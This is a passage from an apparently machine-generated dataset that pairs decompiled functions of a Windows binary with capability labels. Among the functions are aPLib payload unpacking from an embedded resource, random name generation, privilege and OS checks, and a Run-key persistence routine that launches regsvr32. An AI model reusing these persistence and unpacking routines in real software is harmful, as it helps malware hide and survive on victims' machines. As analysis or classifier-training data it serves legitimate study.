param_3;\n        if (uVar8 != 0) {\n            while (puVar5 = puVar6 + -puVar4,  puVar7 = puStack16,  puVar10 = puStack8,  puVar5 <= param_4) {\n                puVar7 = 0x2;\n                if ((puStack16[puVar4] == puVar6[puStack16]) || (puVar5 == param_1[0x109])) {\n                    bVar9 = param_5 == 0x2;\n                    if (0x2 < param_5) {\n                        puVar6 = puVar6 + 2;\n                        do {\n                            if (puVar6[puVar4 - param_3] != *puVar6) break;\n                            puVar7 = puVar7 + 1;\n                            puVar6 = puVar6 + 1;\n                        } while (puVar7 < param_5);\n                        bVar9 = puVar7 == param_5;\n                        puVar6 = param_3;\n                    }\n                    puVar10 = puVar5;\n                    if (bVar9) break;\n                    if (puStack16 < puVar7) {\n                        iVar2 = fcn.0040165a(puVar5, puVar7);\n                        puVar10 = puStack16;\n                        puVar5 = unaff_ESI;\n                        iVar3 = fcn.0040165a();\n                        puVar6 = puStack8;\n                        unaff_ESI = puVar5;\n                        if (puVar7 <= puVar10 + ((iVar2 - iVar3) * 2) / 0xd) goto code_r0x00401be6;\ncode_r0x00401c30:\n                        puVar6 = puStack8;\n                        puStack16 = puVar7;\n                    }\n                    else {\ncode_r0x00401be6:\n                        if (puVar5 == param_1[0x109]) {\n                            iVar2 = fcn.0040165a(puVar5, puVar7);\n                            puVar10 = puStack16;\n                            iVar3 = fcn.0040165a();\n                            puVar6 = NULL;\n                            if (puVar10 <= puVar7 + (iVar3 - iVar2) / 6) goto code_r0x00401c30;\n                        }\n                    }\n                }\n                if (uVar8 + 0x16800 < param_1[0x101] || uVar8 + 0x16800 == param_1[0x101]) {\n                    iVar2 = 0;\n                }\n                else {\n                    uVar1 = param_1[0x103];\n                    if (uVar1 < uVar8) {\n                        iVar2 = uVar8 - uVar1;\n                    }\n                    else {\n                        iVar2 = (uVar8 - uVar1) + 0x16800;\n                    }\n                }\n                uVar8 = *(*param_1 + iVar2 * 4);\n                puVar4 = param_1[0x108] + uVar8;\n                iStack4 = iStack4 + -1;\n                puVar7 = puStack16;\n                puVar10 = puStack8;\n                if ((iStack4 == 0) || (uVar8 == 0)) break;\n            }\n        }\n    }\ncode_r0x00401c82:\n    puStack8 = puVar10;\n    puStack16 = puVar7;\n    param_2[1] = puStack16;\n    *param_2 = puStack8;\n    return;\n}\n",
        "token_count": 1612
    },
    "00403112": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403112(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_ch == 0x110) {\n        fcn.0040304b();\n    }\n    else {\n        if (arg_ch == 0x112) {\n            if (arg_10h == -4000) {\n                return 1;\n            }\n        }\n        else if (arg_ch != 0x113) {\n            return 0;\n        }\n        if (arg_10h == 1) {\n            (*_sym.imp.USER32.dll_KillTimer)(arg_8h, 1);\n            (*_sym.imp.USER32.dll_EndDialog)(arg_8h, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 172
    },
    "00403247": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403247(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    int16_t extraout_DX;\n    \n    if (arg_ch == 0x110) {\n        fcn.00402f4a();\n    }\n    else {\n        iVar6 = 2;\n        uVar5 = *0x40708c;\n        if (arg_ch == 0x111) goto code_r0x00403296;\n        if (arg_ch == 0x112) {\n            if (arg_10h != -4000) goto code_r0x00403296;\n            if (*0x40708c < 100) {\n                return 1;\n            }\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                uVar5 = extraout_ECX;\n                iVar6 = extraout_DX;\ncode_r0x00403296:\n            } while ((arg_10h == iVar6) && (99 < uVar5));\n        }\n        else if (arg_ch != 0x113) {\n            return 0;\n        }\n        if (arg_10h == 1) {\n            *0x40708c = uVar5 + 1;\n            (*_sym.imp.USER32.dll_SendDlgItemMessageA)(arg_8h, 0xfba3, 0x402, *0x40708c, 0);\n            pcVar1 = _sym.imp.USER32.dll_SendDlgItemMessageW;\n            if (*0x40708c == 1) {\n                (*_sym.imp.USER32.dll_SendDlgItemMessageW)(arg_8h, 0xfba4, 0xb1, 0xffffffff, 0xffffffff);\n                uVar3 = *(*0x407094 * 0x44 + 0x407024);\n            }\n            else if (*0x40708c == 10) {\n                (*_sym.imp.USER32.dll_SendDlgItemMessageW)(arg_8h, 0xfba4, 0xb1, 0xffffffff, 0xffffffff);\n                uVar3 = *(*0x407094 * 0x44 + 0x407028);\n            }\n            else if (*0x40708c == 0x14) {\n                (*_sym.imp.USER32.dll_SendDlgItemMessageW)(arg_8h, 0xfba4, 0xb1, 0xffffffff, 0xffffffff);\n                uVar3 = *(*0x407094 * 0x44 + 0x40702c);\n            }\n            else {\n                if (*0x40708c == 0x32) {\n                    (*_sym.imp.USER32.dll_KillTimer)(arg_8h, 1);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004031bb, arg_8h, 0, 0);\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                    return 0;\n                }\n                if (*0x40708c != 0x5a) {\n                    if (*0x40708c != 100) {\n                        return 0;\n                    }\n                    (*_sym.imp.USER32.dll_KillTimer)(arg_8h, 1);\n                    pcVar1 = _sym.imp.USER32.dll_SetDlgItemTextW;\n                    (*_sym.imp.USER32.dll_SetDlgItemTextW)(arg_8h, 0xfb94, *(*0x407094 * 0x44 + 0x407034));\n                    (*pcVar1)(arg_8h, 2, *(*0x407094 * 0x44 + 0x407038));\n                    pcVar1 = _sym.imp.USER32.dll_GetDlgItem;\n                    uVar3 = (*_sym.imp.USER32.dll_GetDlgItem)(arg_8h, 0xfba3, 0);\n                    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n                    (*_sym.imp.USER32.dll_ShowWindow)(uVar3);\n                    uVar3 = (*pcVar1)(arg_8h, 0x3ee, 0);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar1)(arg_8h, 0x3ef, 0);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar1)(arg_8h, 0xfba4, 0);\n                    (*pcVar2)(uVar3);\n                    return 0;\n                }\n                (*_sym.imp.USER32.dll_SendDlgItemMessageW)(arg_8h, 0xfba4, 0xb1, 0xffffffff, 0xffffffff);\n                uVar3 = *(*0x407094 * 0x44 + 0x407030);\n            }\n            (*pcVar1)(arg_8h, 0xfba4, 0xc2, 0, uVar3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1144
    },
    "0040353c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0040353c(void)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    int32_t *piVar3;\n    uint var_18h;\n    uint var_14h;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    uint *TokenInformation;\n    int32_t var_4h;\n    \n    TokenInformationLength = 0;\n    TokenInformation = NULL;\n    var_4h = *0x4070c0;\n    if (*0x4070b8 == 0) {\n        var_4h = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(0xffffffff, 8, &TokenHandle);\n        if (var_4h == 0) {\n            var_4h = 0;\n        }\n        else {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x7a) {\n                TokenInformation = fcn.00404097(TokenInformationLength);\n                if (TokenInformation == NULL) {\n                    var_4h = 0;\n                }\n                else {\n                    var_4h = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                       (TokenHandle, 0x19, TokenInformation, TokenInformationLength, \n                                        &TokenInformationLength);\n                    if (var_4h != 0) {\n                        puVar2 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                        if (puVar2 == NULL) {\n                            var_4h = 0;\n                        }\n                        else {\n                            piVar3 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *puVar2 - 1);\n                            if (piVar3 == NULL) {\n                                var_4h = 0;\n                            }\n                            else {\n                                *0x4070c0 = *piVar3;\n                                *0x4070b8 = 1;\n                                *0x4070c4 = 0;\n                                var_4h = *0x4070c0;\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                var_4h = 0;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            if (TokenInformation != NULL) {\n                fcn.004040e0(TokenInformation);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 556
    },
    "0040366c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040366c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint lpVersionInformation;\n    int32_t var_9ch;\n    uint32_t var_98h;\n    uint var_4h;\n    \n    uVar2 = *0x4070e0;\n    if (*0x4070d8 == 0) {\n        fcn.00404077(&lpVersionInformation, 0, 0x9c);\n        lpVersionInformation = 0x9c;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            *0x4070d8 = 1;\n            *0x4070e0 = var_9ch << 8 | var_98h;\n            *0x4070e4 = 0;\n            uVar2 = var_9ch << 8 | var_98h;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00403733": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00403733(void)\n\n{\n    uint32_t uVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    uint *arg_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0x4070c8 == 0) {\n        uVar1 = fcn.00403700();\n        if (uVar1 < 6) {\n            *0x4070c8 = 1;\n            *0x4070d0 = 0;\n            *0x4070d0 = 0;\n        }\n        else {\n            arg_ch = &var_8h;\n            arg_8h = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar2 = fcn.00404105(arg_8h, arg_ch);\n            if ((iVar2 == 0) || (var_8h == 0)) {\n                *0x4070c8 = 1;\n                *0x4070d0 = 0;\n                *0x4070d0 = 0;\n            }\n            else {\n                *0x4070c8 = 1;\n                *0x4070d0 = 1;\n                *0x4070d0 = 1;\n            }\n        }\n    }\n    else {\n    }\n    return *0x4070d0;\n}\n",
        "token_count": 299
    },
    "00403889": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403889(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_8h == NULL) {\n        if (*0x407098 == 0) {\n            *0x407098 = fcn.00403901();\n        }\n        uVar1 = *0x407098 * 0x343fd + 0x269ec3;\n        *0x407098 = uVar1;\n    }\n    else {\n        *arg_8h = *arg_8h * 0x343fd + 0x269ec3;\n        uVar1 = *arg_8h;\n    }\n    return uVar1 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 167
    },
    "00403a3a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403a3a(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, int16_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = arg_ch;\n    var_ch = 0;\n    if (arg_ch == arg_10h) {\n        var_4h = arg_ch;\n    }\n    else {\n        if (arg_10h < arg_ch) {\n            arg_ch = arg_10h;\n            arg_10h = uVar1;\n        }\n        uVar1 = fcn.00403889(arg_8h);\n        var_4h = uVar1 % (arg_10h - arg_ch) + arg_ch;\n    }\n    uVar1 = fcn.00403889(arg_8h);\n    *arg_14h = uVar1 % 0x1a + 0x41;\n    for (var_8h = 1; var_8h < var_4h; var_8h = var_8h + 1) {\n        if (var_ch == 0) {\n            uVar1 = fcn.00403889(arg_8h);\n            arg_14h[var_8h] = \"aeiou\"[uVar1 % 5];\n            uVar1 = fcn.00403889(arg_8h);\n            var_ch = uVar1 % 2 + 1;\n        }\n        else {\n            uVar1 = fcn.00403889(arg_8h);\n            arg_14h[var_8h] = \"bcdfghjklmnpqrstvwxyz\"[uVar1 % 0x15];\n            var_ch = var_ch + -1;\n        }\n    }\n    if (6 < var_4h) {\n        *(arg_14h + (var_4h & 0xfffffffe)) = *(arg_14h + (var_4h & 0xfffffffe)) + -0x20;\n    }\n    arg_14h[var_4h] = 0;\n    return var_4h;\n}\n",
        "token_count": 488
    },
    "00403b5c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b5c(uint arg_8h, uint arg_ch)\n\n{\n    uint ARG_0;\n    uint var_ch;\n    uint dwErrCode;\n    int32_t hKey;\n    \n    hKey = fcn.00403e1a(0x80000001, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\");\n    if (hKey == 0) {\n        var_ch = 0;\n    }\n    else {\n        (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, L\"regsvr32.exe \\\"%s\\\"\", arg_ch);\n        var_ch = fcn.00403e4c(hKey, arg_8h, &ARG_0);\n        dwErrCode = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n    }\n    return var_ch;\n}\n",
        "token_count": 213
    },
    "00403bd5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403bd5(uint lpFileName, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (arg_ch != 0) {\n        var_4h = fcn.00403c99();\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 0, var_4h, 2, 0x80, 0);\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "00403c12": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403c12(uint hFile, uint lpBuffer, int32_t nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t lpNumberOfBytesWritten;\n    \n    lpNumberOfBytesWritten = 0;\n    if (nNumberOfBytesToWrite == 0) {\n        nNumberOfBytesToWrite = 0;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if ((iVar1 == 0) || (lpNumberOfBytesWritten != nNumberOfBytesToWrite)) {\n            nNumberOfBytesToWrite = 0;\n        }\n    }\n    return nNumberOfBytesToWrite;\n}\n",
        "token_count": 174
    },
    "00403cf1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403cf1(uint hModule, uint lpType, uint lpName, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_14h;\n    uint dwErrCode;\n    uint hResData;\n    uint hResInfo;\n    int32_t var_4h;\n    \n    dwErrCode = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(hModule, lpName, lpType);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = (*_sym.imp.KERNEL32.dll_SizeofResource)(hModule, iVar1);\n        if (var_4h == 0) {\n            var_4h = 0;\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(hModule, iVar1);\n            if (iVar1 == 0) {\n                var_4h = 0;\n            }\n            else {\n                arg_ch = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n                if (arg_ch == 0) {\n                    dwErrCode = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    var_4h = 0;\n                }\n                else {\n                    iVar2 = fcn.00404097(var_4h);\n                    *arg_14h = iVar2;\n                    if (*arg_14h == 0) {\n                        dwErrCode = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        var_4h = 0;\n                    }\n                    else {\n                        fcn.0040402e(*arg_14h, arg_ch, var_4h);\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_FreeResource)(iVar1);\n                (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 440
    },
    "00403ddb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ddb(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t dwErrCode;\n    \n    dwErrCode = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(hKey, lpSubKey, 0, 0, 0, arg_10h, 0, &var_8h, 0);\n    if (dwErrCode != 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n        var_8h = 0;\n    }\n    return var_8h;\n}\n",
        "token_count": 141
    },
    "00403e1a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e1a(uint hKey, uint lpSubKey)\n\n{\n    uint phkResult;\n    int32_t dwErrCode;\n    \n    dwErrCode = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(hKey, lpSubKey, &phkResult);\n    if (dwErrCode != 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n        phkResult = 0;\n    }\n    return phkResult;\n}\n",
        "token_count": 112
    },
    "00403e4c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403e4c(uint hKey, uint lpValueName, uint lpString)\n\n{\n    int32_t iVar1;\n    uint dwErrCode;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, lpValueName, 0, 1, lpString, iVar1 << 1);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(iVar1);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 135
    },
    "00403e8c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403e8c(uint hKey, uint lpValueName, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint dwErrCode;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, lpValueName, 0, 3, arg_10h, arg_14h);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(iVar1);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 125
    },
    "00403ec3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403ec3(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        var_ch = 0;\n    }\n    else if (arg_ch == 0) {\n        var_ch = 0;\n    }\n    else if (arg_10h == NULL) {\n        var_ch = 0;\n    }\n    else {\n        *arg_10h = 0;\n        if (arg_14h != NULL) {\n            *arg_14h = arg_8h[5];\n        }\n        if (((*arg_8h == 0x32335041) && (arg_8h[2] == arg_ch + -0x18)) && (arg_8h[4] != 0)) {\n            iVar1 = fcn.00401000(arg_8h + 6, arg_8h[2]);\n            if (iVar1 == arg_8h[3]) {\n                iVar1 = fcn.00404097(arg_8h[4] + 0x20);\n                *arg_10h = iVar1;\n                if (*arg_10h == 0) {\n                    var_ch = 0;\n                }\n                else {\n                    var_ch = fcn.00402754(arg_8h + 6, arg_8h[2], *arg_10h, arg_8h[4] + 0x20);\n                    if (var_ch == arg_8h[4]) {\n                        var_8h = fcn.00401000(*arg_10h, var_ch);\n                    }\n                    else {\n                        var_8h = 0;\n                    }\n                    if (var_8h != arg_8h[5]) {\n                        fcn.004040e0(*arg_10h);\n                        *arg_10h = 0;\n                        var_ch = 0;\n                    }\n                }\n            }\n            else {\n                var_ch = 0;\n            }\n        }\n        else {\n            var_ch = 0;\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 505
    },
    "0040402e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040402e(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    if (((arg_8h != NULL) && (arg_ch != NULL)) && (arg_10h != 0)) {\n        while (arg_10h != 0) {\n            *arg_8h = *arg_ch;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00404077": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404077(uchar *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    if ((arg_8h != NULL) && (arg_10h != 0)) {\n        for (; arg_10h != 0; arg_10h = arg_10h + -1) {\n            *arg_8h = arg_ch;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00404097": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404097(uint dwBytes)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if ((*0x40709c == 0) && (*0x40709c = (*_sym.imp.KERNEL32.dll_HeapCreate)(0, 0x200000, 0),  *0x40709c == 0)) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x40709c, 8, dwBytes);\n    return uVar1;\n}\n",
        "token_count": 127
    },
    "004040e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040e0(int32_t arg_8h)\n\n{\n    if ((*0x40709c != 0) && (arg_8h != 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x40709c, 0, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00404105": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404105(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint hModule;\n    \n    if (*0x4070ac == NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32.DLL\");\n        if (iVar1 == 0) {\n            return 0;\n        }\n        *0x4070ac = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"IsWow64Process\");\n    }\n    if (*0x4070ac == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**0x4070ac)(arg_8h, arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 175
    },
    "0040165a": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040165a(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0x80) && (param_3 < 4)) {\n        if (param_2 != *(param_1 + 0x424)) {\n            return (-(param_2 != 0) & 6) + 5;\n        }\n    }\n    else if (param_2 != *(param_1 + 0x424)) {\n        if (param_2 < 0x80) {\n            param_3 = param_3 - 2;\n        }\n        else {\n            if (0x4ff < param_2) {\n                param_3 = param_3 - 1;\n            }\n            if (31999 < param_2) {\n                param_3 = param_3 - 1;\n            }\n        }\n        iVar2 = fcn.004010e0((param_2 >> 8) + 3);\n        iVar1 = fcn.004010e0(param_3);\n        return iVar1 + 10 + iVar2;\n    }\n    iVar2 = fcn.004010e0(param_3);\n    return iVar2 + 4;\n}\n",
        "token_count": 292
    },
    "00402754": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong __fastcall\nfcn.00402754(uint param_1, uint param_2, uint8_t *param_3, int32_t param_4, uint8_t *param_5, uint32_t param_6)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    uint32_t unaff_EBP;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    uint32_t uStack40;\n    int32_t iStack36;\n    \n    iStack36 = param_4;\n    uStack40 = param_6;\n    if ((param_3 != NULL) && (param_5 != NULL)) {\n        uVar6 = 0;\n        puVar9 = param_5;\n        while (bVar10 = iStack36 != 0,  iStack36 = iStack36 + -1,  bVar10) {\n            uVar1 = *param_3;\n            param_3 = param_3 + 1;\n            bVar10 = uStack40 == 0;\n            uStack40 = uStack40 - 1;\n            if (bVar10) break;\n            *puVar9 = uVar1;\n            puVar9 = puVar9 + 